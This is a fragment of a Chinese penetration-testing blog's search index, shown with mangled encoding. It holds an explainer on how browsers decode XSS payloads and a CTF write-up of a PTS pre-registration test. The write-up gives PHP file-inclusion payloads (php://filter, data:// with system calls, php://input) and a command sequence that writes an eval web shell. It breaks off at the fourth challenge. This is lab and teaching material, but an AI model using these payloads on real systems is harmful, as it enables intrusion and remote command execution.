","date":"2023-03-30","objectID":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/:4:2","tags":["Pentest","XSS"],"title":"æµè§ˆå™¨XSSç¼–ç è§£æåŸç†","uri":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/"},{"categories":["Pentest"],"content":"4.3 JavaScriptè§£æ JavaScript è§£æä¸åŒäº HTML è§£æï¼Œå› ä¸ºJSè¯­è¨€æœ¬èº«æ˜¯ä¸Šä¸‹æ–‡æ— å…³çš„è¯­è¨€(context free language)ï¼Œï¼Œå¯ä»¥é€šè¿‡ä¸Šä¸‹æ–‡æ— å…³è¯­æ³•(context free grammar)æ¥å¼„æ¸…æ¥š JavaScript æ˜¯å¦‚ä½•è¢«è§£æçš„ã€‚ ECMAScript-262 çš„è§„èŒƒåœ¨è¿™é‡Œï¼Œä¸€ä¸ªå•ç‹¬çš„HTMLè§£æè¯­æ³•æ–‡ä»¶åœ¨è¿™é‡Œã€‚ JSçš„è„šæœ¬å¤„ç†æ¨¡å‹æ˜¯æŒ‰ç…§æºç å¤„ç†-å‡½æ•°è§£æ-ä»£ç æ‰§è¡Œè¿™ä¸ªé¡ºåºè¿›è¡Œï¼Œä¸ç®¡æ˜¯å¤–éƒ¨JSè¿˜æ˜¯\u003cscript\u003e æ ‡ç­¾å†…ï¼Œæˆ–è€… HTMLæ ‡ç­¾å±æ€§ä¸­çš„ï¼Œå¯¹JSç¼–ç çš„è§£ç éƒ½æ˜¯ç›¸åŒçš„ã€‚ 1. æ‰§è¡Œä¸Šä¸‹æ–‡ å½“ä¸€æ®µ JavaScript ä»£ç åœ¨è¿è¡Œçš„æ—¶å€™ï¼Œå®ƒå®é™…ä¸Šæ˜¯è¿è¡Œåœ¨æ‰§è¡Œä¸Šä¸‹æ–‡ä¸­ã€‚è€Œä¸‹åˆ—ä¸‰ç§ä»£ç éƒ½ä¼šåˆ›å»ºç›¸åº”çš„æ‰§è¡Œä¸Šä¸‹æ–‡ï¼š å…¨å±€æ‰§è¡Œä¸Šä¸‹æ–‡ï¼šå®ƒæ˜¯ä¸ºè¿è¡Œä»£ç ä¸»ä½“è€Œåˆ›å»ºçš„æ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒæ˜¯ä¸ºé‚£äº›å­˜åœ¨äºå‡½æ•°ä¹‹å¤–çš„ä»»ä½•ä»£ç è€Œåˆ›å»ºçš„ã€‚ å‡½æ•°æ‰§è¡Œä¸Šä¸‹æ–‡ï¼šæ¯ä¸ªå‡½æ•°ä¼šåœ¨æ‰§è¡Œçš„æ—¶å€™åˆ›å»ºè‡ªå·±çš„æ‰§è¡Œä¸Šä¸‹æ–‡ã€‚ Eval å‡½æ•°æ‰§è¡Œä¸Šä¸‹æ–‡ï¼šä½¿ç”¨ eval() å‡½æ•°ä¹Ÿä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„æ‰§è¡Œä¸Šä¸‹æ–‡ã€‚ è¿™éƒ¨åˆ†å†…å®¹ä¸æ˜¯é‡ç‚¹ï¼Œå°±ä¸å¤šè¯´äº†ã€‚ 2.å­—ç¬¦è§£ç  æˆ‘ä»¬ä¸»è¦å…³æ³¨å…³äºå®‰å…¨æ€§ã€å­—ç¬¦è§£ç æ–¹å¼ä»¥åŠåœ¨æŸäº›ä¸Šä¸‹æ–‡ä¸­è½¬ä¹‰æ˜¯å¦æœ‰æ•ˆè¿™äº›é—®é¢˜ã€‚ é¦–å…ˆï¼Œè®©æˆ‘ä»¬ç¨å¾®å›åˆ° HTML è§£æä¸­çš„\"Raw text\"å…ƒç´ ï¼Œå› ä¸ºå®ƒä¸ JavaScript è§£ææœ‰å…³ã€‚ æ‰€æœ‰â€œscriptâ€å—éƒ½å±äºåŸå§‹æ–‡æœ¬å…ƒç´ ï¼Œâ€œscriptâ€å—æœ‰ä¸€ä¸ªæœ‰è¶£çš„å±æ€§ï¼šå­—ç¬¦å¼•ç”¨å®ä½“åœ¨å…¶ä¸­ä¸è¢«è§£æå’Œè§£ç ã€‚è¿™æ„å‘³ç€é—®é¢˜ 9 ä¸­çš„è„šæœ¬å°†ä¸ä¼šæ‰§è¡Œã€‚ 9.å®ä½“ç¼–ç alert(9); \u003cscript\u003e\u0026#97;\u0026#108;\u0026#101;\u0026#114;\u0026#116\u0026#40;\u0026#57;\u0026#41;\u0026#59\u003c/script\u003e é‚£ä¹ˆåƒ \\uXXXXï¼ˆä¾‹å¦‚ \\u0000ã€\\u000Aï¼‰è¿™æ ·çš„Unicode è½¬ä¹‰åºåˆ—å­—ç¬¦ç¼–ç çš„ JavaScript ä¼šè¢«è§£æå’Œæ‰§è¡Œå—ï¼Ÿç­”æ¡ˆæ˜¯éœ€è¦çœ‹æƒ…å†µï¼Œè¿™å–å†³äºç¼–ç åºåˆ—æ‰€å¤„çš„ä½ç½®ã€‚ æ ¹æ®ä¸Šä¸‹æ–‡ï¼Œæœ‰ä¸‰ç§æƒ…å†µå¯ä»¥ä½¿ç”¨è½¬ä¹‰åºåˆ—ï¼šå­—ç¬¦ä¸²ã€æ ‡è¯†ç¬¦åç§°æˆ–æ§åˆ¶å­—ç¬¦ã€‚ å­—ç¬¦ä¸²ï¼šå½“å­—ç¬¦ä¸²ä¸­å­˜åœ¨ Unicode è½¬ä¹‰åºåˆ—æ—¶ï¼Œå®ƒä»¬åªä¼šè¢«è§£é‡Šä¸ºå¸¸è§„å­—ç¬¦ï¼Œè€Œä¸æ˜¯å•åŒå¼•å·ï¼ˆâ€™ â€œï¼‰æˆ–å¯ä»¥ç»“æŸå­—ç¬¦ä¸²çš„è¡Œç»ˆæ­¢ç¬¦ã€‚è¿™åœ¨ ECMAScript è§„èŒƒä¸­æœ‰æ˜ç¡®è¯´æ˜ã€‚å› æ­¤ï¼ŒUnicode è½¬ä¹‰åºåˆ—æ°¸è¿œä¸ä¼šè„±ç¦» JavaScript ä¸­çš„å­—ç¬¦ä¸²ä¸Šä¸‹æ–‡ï¼Œå› ä¸ºå®ƒä»¬æ€»æ˜¯è¢«è§£é‡Šä¸ºå­—ç¬¦ä¸²æ–‡å­—ã€‚ ECMA-262 edition13.0, Rev 11, Clause 1 â€œECMAScript differs from the Java programming language in the behaviour of Unicode escape sequences. In a Java program, if the Unicode escape sequence \\u000A, for example, occurs within a single-line comment, it is interpreted as a line terminator (Unicode character 000A is line feed) and therefore the next Unicode character is not part of the comment. Similarly, if the Unicode escape sequence \\u000A occurs within a string literal in a Java program, it is likewise interpreted as a line terminator, which is not allowed within a string literalâ€”one must write \\n instead of\\u000A to cause a line feed to be part of the string value of a string literal. In an ECMAScript program, a Unicode escape sequence occurring within a comment is never interpreted and therefore cannot contribute to termination of the comment. Similarly, a Unicode escape sequence occurring within a string literal in an ECMAScript program always contributes a Unicode character to the literal and is never interpreted as a line terminator or as a quote mark that might terminate the string literal.â€ ç¿»è¯‘ï¼š ECMA-262 ç‰ˆæœ¬13.0ï¼Œç¬¬11ç« ï¼Œç¬¬1æ¡æ¬¾ ECMAScript ä¸ Java ç¼–ç¨‹è¯­è¨€çš„åŒºåˆ«åœ¨äº Unicode è½¬ä¹‰åºåˆ—çš„è¡Œä¸ºã€‚ åœ¨Javaä¸­ï¼Œå¦‚æœUnicodeè½¬ä¹‰åºåˆ—\\u000Aï¼Œå‡ºç°åœ¨å•è¡Œæ³¨é‡Šä¸­ï¼Œå®ƒè¢«è§£é‡Šä¸ºè¡Œç»ˆæ­¢ç¬¦ï¼ˆUnicode å­—ç¬¦ 000A æ˜¯æ¢è¡Œç¬¦ï¼‰ï¼Œå› æ­¤ä¸‹ä¸€ä¸ª Unicode å­—ç¬¦å°†ä¸æ˜¯æ³¨é‡Šçš„ä¸€éƒ¨åˆ†ã€‚åŒæ ·ï¼Œå¦‚æœ\\u000A å‡ºç°åœ¨ Java ç¨‹åºçš„å­—ç¬¦ä¸²æ–‡å­—ä¸­ï¼Œå®ƒåŒæ ·è¢«è§£é‡Šä¸ºè¡Œç»ˆæ­¢ç¬¦ï¼Œè¿™åœ¨å­—ç¬¦ä¸²æ–‡å­—ä¸­æ˜¯ä¸å…è®¸çš„â€”â€”å¿…é¡»å†™ \\n è€Œä¸æ˜¯ \\u000A ä»¥ä½¿æ¢è¡Œç¬¦æˆä¸ºå­—ç¬¦ä¸²æ–‡å­—çš„ä¸€éƒ¨åˆ†ã€‚ åœ¨ ECMAScript ç¨‹åºä¸­ï¼Œæ³¨é‡Šä¸­å‡ºç°çš„ Unicode è½¬ä¹‰åºåˆ—æ°¸è¿œä¸ä¼šè¢«è§£é‡Šï¼Œå› æ­¤ä¸ä¼šå¯¼è‡´æ³¨é‡Šçš„ç»ˆæ­¢ã€‚ç±»ä¼¼åœ°ï¼Œåœ¨ ECMAScript ç¨‹åºçš„å­—ç¬¦ä¸²æ–‡å­—ä¸­å‡ºç°çš„ Unicode è½¬ä¹‰åºåˆ—æ€»æ˜¯ä¸ºæ–‡å­—æä¾›ä¸€ä¸ª Unicode å­—ç¬¦ï¼Œå¹¶ä¸”æ°¸è¿œä¸ä¼šè¢«è§£é‡Šä¸ºè¡Œç»ˆæ­¢ç¬¦æˆ–å¯èƒ½å­—ç¬¦ä¸²ç»ˆæ­¢çš„å¼•å·ã€‚ æ ‡è¯†ç¬¦åç§°ï¼šå½“æ ‡è¯†ç¬¦åç§°ä¸­å­˜åœ¨ Unicode è½¬ä¹‰åºåˆ—æ—¶ï¼Œå®ƒä»¬å°†è¢«è§£ç å¹¶è§£é‡Šä¸ºæ ‡è¯†ç¬¦çš„åç§°ï¼Œä¾‹å¦‚å‡½æ•°åç§°ã€å±æ€§åç§°ç­‰ã€‚ è¿™å°±æ˜¯ä¸ºä»€ä¹ˆé—®é¢˜ 10 ä¸­çš„è„šæœ¬æ˜¯å¯æ‰§è¡Œçš„ã€‚ \u003cscript\u003e\\u0061\\u006c\\u0065\\u0072\\u0074(10);\u003c/script\u003e å¦‚æœæˆ‘ä»¬æ·±å…¥ç ”ç©¶è§„èŒƒï¼Œå®ƒä¹Ÿæ¸…æ¥šåœ°è¯´æ˜å¦‚ä¸‹ã€‚ ECMA-262 edition13.0, Rev 12, Clause 6.1 â€œUnicode escape sequences are permitted in an IdentifierName, where they contribute a single Unicode code point to the IdentifierName. The code point is expressed by the CodePoint of the UnicodeEscapeSequence (see 12.8.4). The \\ preceding the UnicodeEscapeSequence and the u and { } code units, if they appear, do not contribute code points to the IdentifierName. A UnicodeEscapeSequence cannot be used to put a code point into an IdentifierName that would otherwise be illegal. â€œ ç¿»è¯‘ï¼š æ ‡è¯†ç¬¦åç§°ä¸­ä¹Ÿå…è®¸ä½¿ç”¨ Unicode è½¬ä¹‰åºåˆ—ï¼Œå®ƒä»¬å°†ä½œä¸ºæ ‡è¯†ç¬¦ä¸­çš„ä¸€ä¸ªå­—ç¬¦ï¼Œç”±Unicode è½¬ä¹‰åºåˆ—çš„ CV è®¡ç®—è½¬æ¢ï¼ˆè§ 7.8.4ï¼‰ã€‚Unicode è½¬ä¹‰åºåˆ—å‰çš„ \\ ä¸ä¼šè½¬æ¢ä¸ºæ ‡è¯†ç¬¦åç§°ä¸­çš„ä¸€ä¸ªå­—ç¬¦ã€‚ Unicode è½¬ä¹‰åºåˆ—ä¸èƒ½ç”¨äºå°†å­—ç¬¦æ”¾å…¥æ ‡è¯†ç¬¦åç§°ä¸­ï¼Œå¦åˆ™å°†æ˜¯éæ³•çš„ã€‚ æ ‡è¯†ç¬¦åç§°ä¸­å…è®¸ä½¿ç”¨ Unicode è½¬ä¹‰åºåˆ—ï¼Œå®ƒä»¬å°†ä½œä¸ºæ ‡è¯†ç¬¦ä¸­çš„Unicodeä»£ç ç‚¹ã€‚ä»£ç ç‚¹ç”± Unicode è½¬ä¹‰åºåˆ—çš„ CodePoint è¡¨ç¤ºï¼ˆè§ 12.8.4ï¼‰ã€‚Unicode è½¬ä¹‰åºåˆ—ä¹‹å‰çš„ \\ ä»¥åŠ u å’Œ { } ä»£ç å•å…ƒï¼ˆå¦‚æœæœ‰ï¼‰ä¸ä¼šä½œä¸ºæ ‡è¯†ç¬¦åç§°ä¸­çš„ä»£ç ç‚¹ã€‚ Unicode è½¬ä¹‰åºåˆ—ä¸èƒ½ç”¨äºå°†ä»£ç ç‚¹æ”¾å…¥æ ‡è¯†ç¬¦åç§°ï¼Œå¦åˆ™å°†æ˜¯éæ³•çš„ã€‚ æ§åˆ¶å­—ç¬¦ï¼šå½“ Unicode è½¬ä¹‰åºåˆ—è¡¨ç¤ºæ§åˆ¶å­—ç¬¦æ—¶ï¼Œå¦‚å•å¼•å·ã€åŒå¼•å·ã€æ‹¬å·ç­‰ï¼Œå®ƒä»¬ä¸ä¼šè¢«è§£é‡Šä¸ºæ§åˆ¶å­—ç¬¦ï¼Œåªä¼šè¢«è§£ç å’Œè§£æä¸ºæ ‡è¯†ç¬¦åç§°æˆ–å­—ç¬¦ä¸²æ–‡å­—ã€‚æŸ¥çœ‹ ECMAScript è¯­æ³•ï¼Œå°±ä¼šå‘ç°æ²¡æœ‰ä»»ä½•å¯ä»¥å……å½“æ§åˆ¶å­—ç¬¦çš„ Unicode è½¬ä¹‰åºåˆ—ã€‚ä¾‹å¦‚ï¼Œå¦‚æœè§£æå™¨æ­£åœ¨è§£æå‡½æ•°è°ƒç”¨è¯­å¥ï¼Œåˆ™æ‹¬å·å¿…é¡»æ˜¯â€œ(â€å’Œâ€œ)â€ï¼Œè€Œä¸æ˜¯åƒ \\u0028 å’Œ \\u0029 è¿™æ ·çš„å­—ç¬¦ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼ŒUnicode è½¬ä¹‰åºåˆ—åªæœ‰åœ¨æ ‡è¯†ç¬¦åç§°çš„ä¸Šä¸‹æ–‡ä¸­æ‰ä¼šè¢«è§£é‡Šä¸ºå­—ç¬¦ä¸²ï¼Œè¿™æ˜¯å”¯ä¸€å¯ä»¥æ³¨å…¥å¹¶åˆ©ç”¨çš„åœ°æ–¹ã€‚ å›é¡¾é—®é¢˜ 11ä¸èµ·ä½œç”¨ï¼Œå› ä¸º â€˜(11)â€™ æ²¡æœ‰è¢«æ­£ç¡®è§£é‡Šè€Œä¸” â€˜alert(11)â€™ ä¸æ˜¯æœ‰æ•ˆçš„æ ‡è¯†ç¬¦åç§°ã€‚ 11.unicodeç¼–ç alert(11) \u003cscript\u003e\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0031\\u0029\u003c/script\u003e é—®é¢˜ 12 ï¼Œ â€˜\\u0031\\u0032â€™ ä¸ä¼šè¢«è§£é‡Šä¸ºå­—ç¬¦ä¸²ï¼Œå› ä¸ºå®ƒä»¬å¿…é¡»ä»¥å•å¼•å·æˆ–åŒå¼•å·å¼€å¤´ï¼Œæˆ–è€…æ˜¯ ASCII æ•°å­—ã€‚ 12.","date":"2023-03-30","objectID":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/:4:3","tags":["Pentest","XSS"],"title":"æµè§ˆå™¨XSSç¼–ç è§£æåŸç†","uri":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/"},{"categories":["Pentest"],"content":"äº”ã€æµè§ˆå™¨è§£ç é¡ºåº åœ¨è®¨è®ºäº†æµè§ˆå™¨ HTMLã€URL å’Œ JavaScript è§£æä¹‹åï¼Œæ‰€æœ‰è¿™äº›å¦‚ä½•ä¸€èµ·å‘æŒ¥ä½œç”¨ï¼Ÿæ¥ä¸‹æ¥å°†éå¸¸ç®€è¦åœ°å›é¡¾æµè§ˆå™¨å¦‚ä½•è§£ææ–‡æ¡£ã€‚ å½“æµè§ˆå™¨ä»ç½‘ç»œå †æ ˆè·å–å†…å®¹æ—¶ï¼ŒHTML è§£æå™¨è¢«è§¦å‘å¹¶å¼€å§‹æ ‡è®°æ–‡æ¡£ã€‚è¿™æ˜¯å®ŒæˆHTMLå­—ç¬¦å¼•ç”¨è§£ç çš„æ­¥éª¤ã€‚æ ‡è®°åŒ–å®Œæˆåï¼Œæ„å»º DOM æ ‘ã€‚ JavaScript è§£æå™¨å¼€å§‹è§£æå†…è”è„šæœ¬å’Œscriptå—ä¸­çš„è„šæœ¬ã€‚è¿™æ˜¯å¯¹ Unicode è½¬ä¹‰åºåˆ—å’Œ Hex è½¬ä¹‰åºåˆ—è¿›è¡Œè§£ç çš„æ­¥éª¤ã€‚ åŒæ—¶ï¼Œå¦‚æœæµè§ˆå™¨é‡åˆ°éœ€è¦ URL çš„ä¸Šä¸‹æ–‡ï¼ŒURL è§£æå™¨ä¹Ÿä¼šå¯åŠ¨ä»¥è§£ç  URL å†…å®¹ã€‚è¿™æ˜¯å®Œæˆ URL è§£ç çš„æ­¥éª¤ã€‚æ ¹æ® URL çš„ä½ç½®ï¼ŒURL è§£æå™¨å¯èƒ½ä¼šåœ¨ JavaScript è§£æå™¨è¿›å…¥ä¹‹å‰æˆ–ä¹‹åè§£æå†…å®¹ã€‚ è€ƒè™‘ä»¥ä¸‹ä¸¤ä¸ªç¤ºä¾‹ã€‚ Example A: \u003ca href=\"UserInput\"\u003e\u003c/a\u003e Example B: \u003ca href=# onclick=\"window.open('UserInput')\"\u003e\u003c/a\u003e åœ¨ç¤ºä¾‹ A ä¸­ï¼ŒHTML è§£æå™¨å°†é¦–å…ˆå¯åŠ¨å¹¶å¯¹ç”¨æˆ·è¾“å…¥æ‰§è¡Œå­—ç¬¦å¼•ç”¨è§£ç ã€‚ç„¶å URL è§£æå™¨å¼€å§‹å¯¹ href ä¸­çš„å€¼è¿›è¡Œ URL è§£ç ã€‚æœ€åï¼Œå¦‚æœ URL scheme æ˜¯ javascriptï¼Œåˆ™ JavaScript è§£æå™¨æ¥æ‰§è¡Œ Unicode è½¬ä¹‰åºåˆ—å’Œ Hex è½¬ä¹‰åºåˆ—è§£ç ã€‚ä¹‹åï¼Œè„šæœ¬è¢«æ‰§è¡Œã€‚æ‰€ä»¥ä¸€å…±æœ‰ä¸‰è½®è§£ç ï¼Œä¾æ¬¡æ˜¯HTMLã€URLã€JavaScriptã€‚ åœ¨ç¤ºä¾‹ B ä¸­ï¼ŒHTML è§£æå™¨ä¹Ÿé¦–å…ˆå¯åŠ¨ã€‚ä½†æ˜¯ä¹‹åï¼ŒJavaScript è§£æå™¨å¼€å§‹è§£æ onclick å¤„ç†ç¨‹åºä¸­çš„å€¼ï¼Œå› ä¸º onclick å¤„ç†ç¨‹åºä¸­éœ€è¦è„šæœ¬ã€‚å½“ JavaScript è¢«è§£æå’Œæ‰§è¡Œæ—¶ï¼Œå®ƒçœ‹åˆ°å®ƒæ­£åœ¨æ‰§è¡Œâ€œwindow.open()â€ï¼Œå…¶ä¸­å‚æ•°åº”è¯¥æ˜¯ä¸€ä¸ª URLã€‚æ­¤æ—¶ï¼ŒURL è§£æå™¨å¼€å§‹å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œ URL è§£ç ï¼Œå¹¶å°†ç»“æœä¼ å› JavaScript å¼•æ“ã€‚æ‰€ä»¥ä¸€å…±æœ‰ä¸‰è½®è§£ç ï¼Œä¾æ¬¡æ˜¯HTMLã€JavaScriptã€URLã€‚ æœ‰æ²¡æœ‰å¯èƒ½è¶…è¿‡ä¸‰è½®è§£ç ï¼Ÿè€ƒè™‘ä¸‹é¢çš„ä¾‹å­ Example C: \u003ca href=\"javascript:window.open('UserInput')\"\u003e ç¤ºä¾‹ C ä¸ A ç±»ä¼¼ï¼Œä½†åœ¨ JavaScript ä¸­å­˜åœ¨â€œwindow.openâ€è°ƒç”¨çš„æ„ä¹‰ä¸Šä¹Ÿæœ‰æ‰€ä¸åŒã€‚å› æ­¤ï¼Œå°†å¯¹ UserInput è¿›è¡Œé¢å¤–çš„ URL è§£ç ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ä¼šè¿›è¡Œå››æ¬¡è§£ç ï¼Œä¾æ¬¡ä¸ºHTMLã€URLã€JavaScriptã€URLã€‚ æ­¤æ—¶ï¼Œæ‚¨åº”è¯¥å…·å¤‡è§£å†³æ–‡ç« å¼€å¤´æ‰€æœ‰é—®é¢˜çš„å¿…è¦çŸ¥è¯†ã€‚ ","date":"2023-03-30","objectID":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/:5:0","tags":["Pentest","XSS"],"title":"æµè§ˆå™¨XSSç¼–ç è§£æåŸç†","uri":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/"},{"categories":["Pentest"],"content":"å…­ã€æ€»ç»“ æ€»è€Œè¨€ä¹‹ï¼Œä¸ºäº†äº†è§£å¦‚ä½•ä½¿ XSS payloadè„±ç¦»æ”»å‡»è€…çš„ä¸Šä¸‹æ–‡ï¼Œæˆ–è€…å¦‚ä½•ä½¿åº”ç”¨ç¨‹åºæœåŠ¡å™¨æ­£ç¡®ç¼–ç ç”¨æˆ·è¾“å…¥ï¼Œå°±å¿…é¡»çœŸæ­£äº†è§£æµè§ˆå™¨è§£æå™¨çš„å·¥ä½œåŸç†ä»¥åŠç»„ä»¶ï¼ˆHTMLã€URL å’Œ JavaScript è§£æå™¨ï¼‰å¦‚ä½•ååŒå·¥ä½œã€‚ åŒæ ·ï¼Œå¦‚æœæƒ³è¦ç»•è¿‡é˜²å¾¡æ£€æµ‹ï¼Œä½¿payloadèƒ½å¤Ÿè¢«æ­£ç¡®è§£ææ‰§è¡Œï¼Œä¹Ÿå¿…é¡»è¦äº†è§£æµè§ˆå™¨çš„å·¥ä½œåŸç†å’Œè§£æå™¨çš„åè°ƒå¤„ç†ï¼Œåªæœ‰åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‰èƒ½åƒæµè§ˆå™¨ä¸€æ ·æ­£ç¡®åœ°ç¼–ç æ”»å‡»è½½è·ã€‚ ","date":"2023-03-30","objectID":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/:6:0","tags":["Pentest","XSS"],"title":"æµè§ˆå™¨XSSç¼–ç è§£æåŸç†","uri":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/"},{"categories":["Pentest"],"content":"å‚è€ƒæ–‡ç« ï¼š Deep dive into browser parsing and XSS payload encoding HTMLæ ‡è®°è§„èŒƒ URLè§„èŒƒ HTML è¯­æ³• æµè§ˆå™¨è§£æHTMLï¼Œæ¸²æŸ“é¡µé¢çš„è¿‡ç¨‹ æ·±å…¥ç†è§£æµè§ˆå™¨è§£ææ¸²æŸ“ HTML æµè§ˆå™¨å·¥ä½œåŸç†ä¸XSS-HTMLç¼–ç  ç†è§£ JavaScript çš„æ‰§è¡Œä¸Šä¸‹æ–‡è¿™ç¯‡å°±å¤Ÿäº†ï¼ ","date":"2023-03-30","objectID":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/:7:0","tags":["Pentest","XSS"],"title":"æµè§ˆå™¨XSSç¼–ç è§£æåŸç†","uri":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/"},{"categories":["é¶åœº"],"content":"æœ€è¿‘æƒ³è€ƒPTSï¼Œæƒ³å…ˆäº†è§£ä¸€ä¸‹ç›¸å…³å†…å®¹ï¼Œæœ‹å‹å°±ç»™æˆ‘å‘äº†ä¸€ä¸ªè°·å®‰çš„é—®å·è°ƒæŸ¥ï¼Œä¸Šé¢æœ‰äº›CTFé¢˜ï¼Œåšç€ç©ç©ã€‚ é¢˜ç›®æ¥æºï¼š è°·å®‰å­¦é™¢CISP-PTSæ¸—é€æµ‹è¯•ä¸“å®¶è®¤è¯-é¢„æŠ¥åæµ‹è¯• https://ks.wjx.top/jq/94623813.aspx é—®å·ä¸ºè°·å®‰å­¦é™¢æ¸—é€æµ‹è¯•ä¸“å®¶CISP-PTSè®¤è¯é¢„æŠ¥åæµ‹è¯•é¢˜ã€‚ 3é“å®æ“é¢˜ç›®ç­”å¯¹2é“å³å¯æŠ¥åPTSã€‚ ","date":"2023-02-28","objectID":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/:0:0","tags":["PTS","CTF","è¯ä¹¦"],"title":"PTS è°·å®‰é¢„æŠ¥åæµ‹è¯•","uri":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/"},{"categories":["é¶åœº"],"content":"1ã€POST\u0026GET é¢˜ç›®é“¾æ¥ï¼šhttp://118.195.198.108:9997/ ğŸ’¡ hintï¼š è¯·ä»¥getæ–¹å¼æäº¤a=1 postæ–¹å¼æäº¤b=2ç»™æœåŠ¡å™¨ Poc: POST /?a=1 HTTP/1.1 Host: 118.195.198.108:9997 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 3 b=2 è¿”å›keyï¼Œkey1:T0kS7r3c ","date":"2023-02-28","objectID":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/:1:0","tags":["PTS","CTF","è¯ä¹¦"],"title":"PTS è°·å®‰é¢„æŠ¥åæµ‹è¯•","uri":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/"},{"categories":["é¶åœº"],"content":"2ã€include é¢˜ç›®é“¾æ¥ï¼šhttp://118.195.198.108:9998/ ğŸ’¡Hint: \u003c?php show_source(__FILE__); echo $_GET['hello']; $page=$_GET['page']; //while (strstr($page, \"php://\")) { // $page=str_replace(\"php://\", \"\", $page); //} include($page); ?\u003e åˆ©ç”¨ç‚¹å°±æ˜¯include($page);ï¼Œæ³¨é‡Šä¸­æç¤ºäº†php://ä¼ªåè®® Poc: ?hello=\u0026page=php://filter/read=convert.base64-encode/resource=flag.php ?hello=\u0026page=data://text/plain,\u003c?php system('ls');?\u003e è€ƒç‚¹ï¼šæ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä¼ªåè®® POST /?hello=\u0026page=php://input HTTP/1.1 Host: 118.195.198.108:9998 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 31 \u003c?php system('cat flag.php');?\u003e ","date":"2023-02-28","objectID":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/:2:0","tags":["PTS","CTF","è¯ä¹¦"],"title":"PTS è°·å®‰é¢„æŠ¥åæµ‹è¯•","uri":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/"},{"categories":["é¶åœº"],"content":"3ã€Hacked by Alphabug é¢˜ç›®é“¾æ¥ï¼šhttp://118.195.198.108:9999/ ğŸ’¡ Hint: 0 \u003c?php #Hacked by Alphabug header(\"Content-type:text/html;charset=utf-8\"); /* Hint: get the shell find the keyï¼›ï¼‰\\n\"; */ $sandbox = '/var/www/html/sandbox/' . md5(\"M0rk\" . $_SERVER['REMOTE_ADDR']); mkdir($sandbox,0777,true); chdir($sandbox); echo strlen($_GET['cmd']); if (isset($_GET['cmd']) \u0026\u0026 strlen($_GET['cmd']) \u003c= 30) { @exec($_GET['cmd']); } else if (isset($_GET['reset'])) { @exec('/bin/rm -rf ' . $sandbox); } highlight_file(__FILE__); echo \"\u003cbr /\u003e IP : {$_SERVER['REMOTE_ADDR']}\"; ?\u003e IP : xxxxxx md5(\"M0rk\" . $_SERVER['REMOTE_ADDR'])ç®—å‡ºè‡ªå·±çš„sandboxåœ°å€ã€‚ é€šè¿‡cmdè¿›è¡Œå†™shellï¼Œä¸ºäº†åŠæ—¶å‘ç°è‡ªå·±çš„é”™è¯¯ï¼Œå¯ä»¥å…ˆå†™txtï¼Œå†é€šè¿‡cpå‘½ä»¤è½¬æˆphp ?cmd=echo+'\u003c?php'\u003e\u003ei.txt ?cmd=echo+'$a=$_POST[\"a\"];'\u003e\u003ei.txt ?cmd=echo+'eval($a);'\u003e\u003ei.txt ?cmd=cp+i.txt+i.php è¿æ¥shellï¼Œè·å–flag ","date":"2023-02-28","objectID":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/:3:0","tags":["PTS","CTF","è¯ä¹¦"],"title":"PTS è°·å®‰é¢„æŠ¥åæµ‹è¯•","uri":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/"},{"categories":["é¶åœº"],"content":"4ã€å¯†ç æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ ğŸ’¡Hint å¯†ç 